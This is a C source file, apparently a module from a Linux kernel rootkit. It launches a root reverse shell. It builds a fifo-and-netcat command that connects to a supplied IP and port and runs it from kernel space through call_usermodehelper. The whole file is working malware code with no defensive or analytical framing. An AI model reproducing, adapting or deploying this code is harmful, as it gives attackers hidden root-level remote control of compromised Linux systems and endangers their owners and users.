#include <linux/string.h>
#include <linux/slab.h>
#include <linux/kmod.h>
#include <linux/kernel.h>

#include "revshell.h"
#include "hooking.h"

#define PATH "PATH=/sbin:/bin:/usr/sbin:/usr/bin"
#define HOME "HOME=/root"
#define TERM "TERM=xterm"
#define SHELL "/bin/bash"
#define EXEC_P1 "/bin/rm /etc/fifo;/usr/bin/mkfifo /etc/fifo;/bin/cat /etc/fifo|/bin/sh -i 2>&1 | /usr/bin/nc "
#define EXEC_P2 " >/etc/fifo"
				

void execute_reverse_shell(struct work_struct *work) {
    struct shell_params *params = (struct shell_params *)work;

    char *envp[] = {
        HOME,
        TERM,
        params->target_ip,
        params->target_port,
        NULL
    };


    char *exec = kmalloc(sizeof(char) * 256, GFP_KERNEL);
    memset(exec, 0, sizeof(char) * 256);

 
    strcat(exec, EXEC_P1);
    strcat(exec, params->target_ip);
    strcat(exec, " ");
    strcat(exec, params->target_port);
    strcat(exec, EXEC_P2);


    char *argv[] = {
        SHELL,
        "-c",
        exec,
        NULL
    };


    m_printd(KERN_INFO ":: Starting reverse shell %s\n", exec);


    int err = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    if (err < 0) {
        m_printd(KERN_INFO ":: Error executing usermodehelper.\n");
    }


    kfree(exec);
    kfree(params->target_ip);
    kfree(params->target_port);
    kfree(params);
}



int start_reverse_shell(char* ip, char* port){
    int err;
    struct shell_params *params = kmalloc(sizeof(struct shell_params), GFP_KERNEL);
    if(!params){
        m_printd(KERN_INFO ":: Error allocating memory\n");
        return 1;
    }
    params->target_ip = kstrdup(ip, GFP_KERNEL);
    params->target_port = kstrdup(port, GFP_KERNEL);
    m_printd(KERN_INFO "Loading work\n");
    INIT_WORK(&params->work, &execute_reverse_shell);

    err = schedule_work(&params->work);
    if(err<0){
        m_printd(KERN_INFO ":: Error scheduling work of starting shell\n");
    }
    return err;

}
